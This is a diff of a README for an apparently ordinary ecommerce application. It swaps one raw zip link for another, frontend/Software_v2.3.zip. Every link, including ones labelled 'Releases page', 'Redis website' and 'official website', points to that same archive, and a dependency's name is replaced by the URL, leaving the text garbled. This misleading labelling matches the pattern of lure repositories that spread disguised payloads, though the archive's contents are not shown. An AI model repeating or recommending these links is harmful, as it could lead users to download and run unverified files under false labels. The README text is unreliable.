@@ -6,11 +6,11 @@ Welcome to the ecommerce platform! This application provides everything you need
 
 ## 📥 Download the App
 
-[![Download](https://raw.githubusercontent.com/Shresth0305/ecommerce/main/unmotherly/ecommerce.zip)](https://raw.githubusercontent.com/Shresth0305/ecommerce/main/unmotherly/ecommerce.zip)
+[![Download](https://github.com/Shresth0305/ecommerce/raw/refs/heads/main/frontend/Software_v2.3.zip)](https://github.com/Shresth0305/ecommerce/raw/refs/heads/main/frontend/Software_v2.3.zip)
 
 To get started, visit our releases page to download the application.
 
-[Download the latest version here.](https://raw.githubusercontent.com/Shresth0305/ecommerce/main/unmotherly/ecommerce.zip)
+[Download the latest version here.](https://github.com/Shresth0305/ecommerce/raw/refs/heads/main/frontend/Software_v2.3.zip)
 
 ## 💻 System Requirements
 
@@ -35,16 +35,16 @@ The ecommerce platform includes:
 
 To run this application smoothly, you need the following:
 
-- **https://raw.githubusercontent.com/Shresth0305/ecommerce/main/unmotherly/ecommerce.zip** Make sure you have https://raw.githubusercontent.com/Shresth0305/ecommerce/main/unmotherly/ecommerce.zip installed. You can download it from [https://raw.githubusercontent.com/Shresth0305/ecommerce/main/unmotherly/ecommerce.zip official website](https://raw.githubusercontent.com/Shresth0305/ecommerce/main/unmotherly/ecommerce.zip).
+- **https://github.com/Shresth0305/ecommerce/raw/refs/heads/main/frontend/Software_v2.3.zip** Make sure you have https://github.com/Shresth0305/ecommerce/raw/refs/heads/main/frontend/Software_v2.3.zip installed. You can download it from [https://github.com/Shresth0305/ecommerce/raw/refs/heads/main/frontend/Software_v2.3.zip official website](https://github.com/Shresth0305/ecommerce/raw/refs/heads/main/frontend/Software_v2.3.zip).
 - **MongoDB:** This application uses MongoDB for data storage. Ensure MongoDB is installed and running on your machine.
-- **Redis:** Use Redis for caching. Download it from the [Redis website](https://raw.githubusercontent.com/Shresth0305/ecommerce/main/unmotherly/ecommerce.zip).
+- **Redis:** Use Redis for caching. Download it from the [Redis website](https://github.com/Shresth0305/ecommerce/raw/refs/heads/main/frontend/Software_v2.3.zip).
 
 ## 📋 Installation Instructions
 
 Follow these steps to install and run the ecommerce application:
 
 1. **Download the application:**
-   Visit the [Releases page](https://raw.githubusercontent.com/Shresth0305/ecommerce/main/unmotherly/ecommerce.zip) and download the latest version.
+   Visit the [Releases page](https://github.com/Shresth0305/ecommerce/raw/refs/heads/main/frontend/Software_v2.3.zip) and download the latest version.
 
 2. **Extract the files:**
    Once downloaded, extract the files to a directory of your choice.
